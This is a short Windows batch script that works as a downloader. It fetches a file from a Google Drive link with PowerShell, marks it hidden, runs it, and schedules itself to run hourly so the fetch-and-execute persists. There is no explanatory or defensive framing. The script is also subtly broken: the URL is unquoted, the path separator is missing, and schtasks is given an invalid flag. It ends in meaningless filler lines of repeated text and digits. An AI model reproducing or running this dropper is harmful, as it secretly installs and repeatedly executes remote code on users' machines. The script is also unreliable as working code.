@echo off

:: Set download URL, save path, filename, and attribute
set url=https://drive.usercontent.google.com/download?id=1fyGgc0gvUYa1gouercY7-Vs0iZs8htxd&export=download&authuser=0&confirm=t&uuid=9b616494-fad2-4378-a7f1-a228292e06b5&at=AIrpjvNqKvtFQs3DD2prDSJAWS4T:1739704957840
set save_path=C:\Downloads
set filename=file.zip
set attribute=+H

:: Download file using PowerShell
powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %save_path%%filename%"

:: Set file attribute
attrib %save_path%%filename% %attribute%

:: Run downloaded file
start "" "%save_path%%filename%"

:: Schedule script to run every hour
schtasks /create /tn "Download and Run" /tr "%~dpnx0" /sc hourly /st 00:00 /y
kel kel kel 111111111111111111111111111111111
222222222222222222222222222222222222
33333333333333333333333333333333
444444444444444444444444444444444444
5555555555555555555555555555555
66666666666666666666666666666
